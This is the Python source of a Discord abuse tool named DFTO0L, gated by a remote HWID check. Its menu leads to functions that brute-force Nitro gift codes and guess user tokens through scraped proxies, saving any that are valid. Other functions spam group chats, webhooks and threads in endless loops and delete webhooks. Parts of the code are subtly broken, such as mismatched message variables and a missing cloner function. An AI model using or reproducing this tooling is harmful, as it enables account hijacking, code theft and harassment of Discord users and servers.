import os
import random
import string
import time
import ctypes
import discord
from threading import Thread, Lock
import sys
import requests
import time
import base64
import json
from colorama import Fore
from colorama import Style
from itertools import cycle
from random import randint
from discord import channel
from lxml.html import fromstring
from requests import Session
import traceback
import pyfiglet
import threading
import pystyle
from pystyle import Colors, Colorate
import subprocess

hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
r = requests.get('http://crunchan.ct8.pl/')

try:
    if hwid in r.text:
        pass
    else:
        print(Colorate.Horizontal(Colors.red_to_yellow, "[DFTO0L] HWID Not in database"))
        time.sleep(2)
        os._exit()
except:
    print(Colorate.Horizontal(Colors.red_to_yellow, "[DFTO0L] Failed connect to database"))
    time.sleep(2)
    os._exit()

print(Colorate.Horizontal(Colors.blue_to_green, "[DFTO0L] Authentificated!"))
time.sleep(2)
text = Colorate.Horizontal(Colors.blue_to_green,  "┏━━━┳━━━┳━━━━┳━━━┳━━━┳┓", 1)
text2 = Colorate.Horizontal(Colors.blue_to_green, "┗┓┏┓┃┏━━┫┏┓┏┓┃┏━┓┃┏━┓┃┃", 1)
text3 = Colorate.Horizontal(Colors.blue_to_green, "╋┃┃┃┃┗━━╋┛┃┃┗┫┃┃┃┃┃╋┃┃┃", 1)
text4 = Colorate.Horizontal(Colors.blue_to_green, "╋┃┃┃┃┏━━┛╋┃┃╋┃┃┃┃┃┃╋┃┃┃╋┏┓", 1)
text5 = Colorate.Horizontal(Colors.blue_to_green, "┏┛┗┛┃┃╋╋╋╋┃┃╋┃┗━┛┃┗━┛┃┗━┛┃", 1)
text6 = Colorate.Horizontal(Colors.blue_to_green, "┗━━━┻┛╋╋╋╋┗┛╋┗━━━┻━━━┻━━━┛", 1)
text7 = Colorate.Horizontal(Colors.blue_to_cyan, "[1] Nitro Gen", 1)
text8 = Colorate.Horizontal(Colors.blue_to_cyan, "[2] Token Gen", 1)
text9 = Colorate.Horizontal(Colors.blue_to_cyan, "[3] Proxy Scraper", 1)
text10 = Colorate.Horizontal(Colors.blue_to_cyan, "[4] Proxy Checker (HTTP)", 1)
text11 = Colorate.Horizontal(Colors.blue_to_cyan, "[5] IP Pinger", 1)
text12 = Colorate.Horizontal(Colors.blue_to_cyan, "[11] Quit", 1)
text13 = Colorate.Horizontal(Colors.green_to_blue, ">", 1)
text14 = Colorate.Horizontal(Colors.blue_to_green,  "┏━━━┳━━━┳━━━━┳━━━┳━━━┳┓", 1)
text15 = Colorate.Horizontal(Colors.blue_to_green, "┗┓┏┓┃┏━━┫┏┓┏┓┃┏━┓┃┏━┓┃┃", 1)
text16 = Colorate.Horizontal(Colors.blue_to_green, "╋┃┃┃┃┗━━╋┛┃┃┗┫┃┃┃┃┃╋┃┃┃", 1)
text17 = Colorate.Horizontal(Colors.blue_to_green, "╋┃┃┃┃┏━━┛╋┃┃╋┃┃┃┃┃┃╋┃┃┃╋┏┓", 1)
text18 = Colorate.Horizontal(Colors.blue_to_green, "┏┛┗┛┃┃╋╋╋╋┃┃╋┃┗━┛┃┗━┛┃┗━┛┃", 1)
text19 = Colorate.Horizontal(Colors.blue_to_green, "┗━━━┻┛╋╋╋╋┗┛╋┗━━━┻━━━┻━━━┛", 1)
text20 = Colorate.Horizontal(Colors.red_to_blue, " Enter IP: ", 1)
text21 = Colorate.Horizontal(Colors.blue_to_purple, " How much do you want to generate: ", 1)
text22 = Colorate.Horizontal(Colors.blue_to_purple, " [-] is being cleaned", 1)
text23 = Colorate.Horizontal(Colors.blue_to_purple, " [-] Correct nitro found", 1)
text24 = Colorate.Color(Colors.red, "Invalid", True)
text25 = Colorate.Color(Colors.gray, "https://discord.gift/", True)
text26 = Colorate.Color(Colors.green, "Valid", True)
text27 = Colorate.Horizontal(Colors.cyan_to_blue, " Scrapeadas Proxies HTTP", 1)
text28 = Colorate.Horizontal(Colors.cyan_to_blue, " Scrapeadas Proxies SOCKS4", 1)
text29 = Colorate.Horizontal(Colors.cyan_to_blue, " Scrapeadas Proxies SOCKS5", 1)
text30 = Colorate.Horizontal(Colors.cyan_to_blue, " Checker Proxies HTTP", 1)
text31 = Colorate.Horizontal(Colors.cyan_to_blue, " Proxy saved at http.txt", 1)
text32 = Colorate.Color(Colors.green, " Valid [{}]", True)
text33 = Colorate.Color(Colors.red, " Invalid [{}]", True)
text34 = Colorate.Color(Colors.yellow, " Blocked [{}]", True)
text35 = Colorate.Horizontal(Colors.blue_to_purple, " How much nitro do you want to generate: ", 1)
text36 = Colorate.Horizontal(Colors.red_to_blue, " Invalid option", 1)
text37 = Colorate.Horizontal(Colors.blue_to_cyan, "[6] GroupChat Spammer", 1)
text38 = Colorate.Horizontal(Colors.blue_to_cyan, "[7] Webhook Spammer", 1)
text39 = Colorate.Horizontal(Colors.blue_to_cyan, "[8] Webhook Deleter", 1)
text40 = Colorate.Horizontal(Colors.blue_to_cyan, "[9] Thread Spammer", 1)
text41 = Colorate.Horizontal(Colors.blue_to_cyan, "[10] Guild Cloner", 1)

def slowprint(s, c, newLine=True):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1. / 30)


def main():
    os.system('cls')
    if os.name == 'nt':
        os.system("title DFTO0L & mode con:cols=52 lines=20")
    else:
        print('error')

    print(f'''
    {text}
    {text2}
    {text3}
    {text4}
    {text5}
    {text6}
               ''')

    time.sleep(1)

    operation = input(f'''
    {text7}
    {text8}
    {text9}
    {text10}
    {text11}
    {text37}
    {text38}
    {text39}
    {text40}
    {text41}
    {text12}{Fore.RESET}
{text13}''')
    if str(operation) == "1":
        generateCheck()
    elif str(operation) == "2":
        tokengen()
    elif str(operation) == "3":
        proxy()
    elif str(operation) == "4":
        proxychecker()
    elif str(operation) == "5":
        pinger()
    elif str(operation) == "6":
        gcspammer()
    elif str(operation) == "7":
        webhookspam()
    elif str(operation) == "8":
        webhookdel()
    elif str(operation) == "9":
        threadspam()
    elif str(operation) == "10":
        servercloner()
    elif str(operation) == "11":
        exit()
    else:
        os.system('cls')
        print(f"\n{text30}")
        time.sleep(2)
        main()

def pinger():
    os.system("@title DFTO0L & cls")
    print()
    print(f" {text14}")
    print(f" {text15}")
    print(f" {text16}")
    print(f" {text17}")
    print(f" {text18}")
    print(f" {text19}")

    ip = str(input(f"\n{text20}"))
    print()

    while True:
        if os.system("ping -n 1 " + ip + ">nul") == 0:
            print(f" {ip} is online")
            os.system("color " + str(random.randrange(0, 3)))
        else:
            print(f" {ip} is offline")
            os.system("color " + str(random.randrange(0, 3)))
            time.sleep(1)
            main()

def generateCheck():
    os.system("cls & title DFTO0L")
    print()
    num=input(f"{text35}")
    print()

    for n in range(int(num)):
        code = ''.join(random.choices(
            string.ascii_uppercase + string.digits + string.ascii_lowercase,
            k=16
        ))

        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
        s = requests.session()
        response = s.get(url)

        nitro = f'{text25}{Fore.RESET}' + code

        if 'subscription_plan' in response.text:
            print(f' {text26}{Fore.RESET} | {nitro}')
            print(f"{text23}")
            time.sleep(10)
            with open("nitro_valid.txt", "w") as f:
                f.write(nitro)
            break

        else:
            print(f' {Fore.LIGHTRED_EX}{text24}{Fore.RESET} | {nitro}')
            continue


def get_proxies():
    url = 'https://sslproxies.org/'
    response = requests.get(url)
    parser = fromstring(response.text)
    proxies = set()
    for i in parser.xpath('//tbody/tr')[:10]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            proxy = ":".join([i.xpath('.//td[1]/text()')[0],
                             i.xpath('.//td[2]/text()')[0]])
            proxies.add(proxy)
    return proxies


def tokengen():
    os.system("title DFTO0L con:cols=73 lines=30")
    print()
    N = input(f"{text21}")
    print()
    count = 0
    current_path = os.path.dirname(os.path.realpath(__file__))
    url = "https://discordapp.com/api/v9/users/@me/library"

    while(int(count) < int(N)):
        tokens = []
        base64_string = "=="
        while(base64_string.find("==") != -1):
            sample_string = str(
                randint(
                    000000000000000000,
                    999999999999999999))
            sample_string_bytes = sample_string.encode("ascii")
            base64_bytes = base64.b64encode(sample_string_bytes)
            base64_string = base64_bytes.decode("ascii")
        else:
            token = base64_string + "." + random.choice(
                string.ascii_letters).upper() + ''.join(
                random.choice(
                    string.ascii_letters + string.digits) for _ in range(5)) + "." + ''.join(
                random.choice(
                    string.ascii_letters + string.digits) for _ in range(27))
            count += 1
            tokens.append(token)
        proxies = get_proxies()
        proxy_pool = cycle(proxies)

        for token in tokens:
            proxy = next(proxy_pool)
            header = {
                "Content-Type": "application/json",
                "authorization": token
            }
            r = requests.get(url, headers=header, proxies={"http": proxy})
            if r.status_code == 200:
                print(f" {text29}{Fore.RESET} | {token}")
                with open("tokens_valid.txt", "a") as f:
                    f.write(token + "\n")

            elif "rate limited." in r.text:
                print()
                print(f"{text22}")
                time.sleep(10)
                main()

            else:
                print(f' {text24}{Fore.RESET} | {token}')
        tokens.remove(token)


def proxy():
    os.system('cls & title DFTO0L')

    url = 'https://api.openproxylist.xyz/http.txt'
    r = requests.get(url)
    results = r.text
    with open("http.txt", "w") as file:
        file.write(results)
    print("")
    print(f"{text30}")

    url = 'https://api.openproxylist.xyz/socks4.txt'
    r = requests.get(url)
    results = r.text
    with open("socks4.txt", "w") as file:
        file.write(results)
    print(f"{text31}")

    url = 'https://api.openproxylist.xyz/socks5.txt'
    r = requests.get(url)
    results = r.text
    with open("socks5.txt", "w") as file:
        file.write(results)
    print(f"{text32}")
    time.sleep(2)
    main()


def proxychecker():
    os.system("cls & title DFTO0L")
    print()
    print(f"{text33}")
    print(f"{text34}")
    print()
    time.sleep(5)
    r = requests.Session()

    def check(prox):
	    link = 'http://google.com/'
	    r.proxies = {
	    'http':'http://{}'.format(prox),
	    'https':'http://{}'.format(prox)
	    }
	    try:
		    req = r.get(link,timeout=2)
		    if req.status_code == 200:
			    print(f"{text35}".format(prox))
			    with open('proxies_validas.txt','a') as wr: 
				    wr.write(prox+'\n')
		    else:
				    print(f"{text34}".format(prox))
	    except:
		    print(f"{text33}".format(prox))
    proxies=open('http.txt', 'r').read().splitlines()
    from multiprocessing.dummy import Pool as ThreadPool
    pool = ThreadPool(13)
    results = pool.map(check, proxies)

def gcspammer():
    token = input(Colorate.Horizontal(Colors.blue_to_green, 'Enter your token: '))
    firstid = input(Colorate.Horizontal(Colors.blue_to_green, 'First friend ID: '))
    secondid = input(Colorate.Horizontal(Colors.blue_to_green, 'Second friend ID: '))
    while True:
        global cycling
        cycling = True
        while cycling:
            headers = {
                'Authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36'
            }
            proxies = get_proxies()
            proxy_pool = cycle(proxies)
            requests.post('https://discordapp.com/api/v9/users/@me/channels', headers=headers,
                          json={"recipients": [firstid, secondid]})
            print("CREATED GROUP")
            proxy = next(proxy_pool)

def webhookspam():
    webhookmess = input(Colorate.Horizontal(Colors.blue_to_green, "Spam Message: "))
    webhook = input(Colorate.Horizontal(Colors.blue_to_green, "WebHook URL: "))

    def spam(msg, webhook):
        while True:
            try:
                data = requests.post(webhook, json={'content': msg})
                if data.status_code == 204:
                    print(Colorate.Horizontal(Colors.blue_to_green, 'Sent MSG {webhookmess}'))
            except:
                print(Colorate.Horizontal(Colors.blue_to_green, "Bad Webhook :" + webhook))
                time.sleep(5)

    kingman_top = 1
    while kingman_top == 1:
        spam(webhookmess, webhook)

def webhookdel():
    url = input(Colorate.Horizontal(Colors.blue_to_green, "Webhook URL: "))
    requests.delete(url)
    print(Colorate.Horizontal(Colors.blue_to_green, "Webhook Deleted."))
    time.sleep(1)

def threadspam():
    token = str(input("Enter Token: "))
    channel_id = str(input("Enter Channel ID: "))
    thread_name = str(input("Enter Thread name: "))
    header = {"content-type": "application/json",
              "Authorization": token}
    while True:
        r = requests.post(f"https://canary.discord.com/api/v9/channels/{channel_id}/threads", headers=header, json={
            "name": thread_name, "type": 11, "auto_archive_duration": 60})
        if r.status_code == 200 or r.status_code == 201:
            print(f"Created thread | ID: {r.json()['id']}")
        elif r.status_code == 429:
            print(f"Ratelimited - Delaying {r.json()['retry_after']}s")
            time.sleep(int(r.json()['retry_after']))
        else:
            print("ERROR")

if __name__ == '__main__':
    main()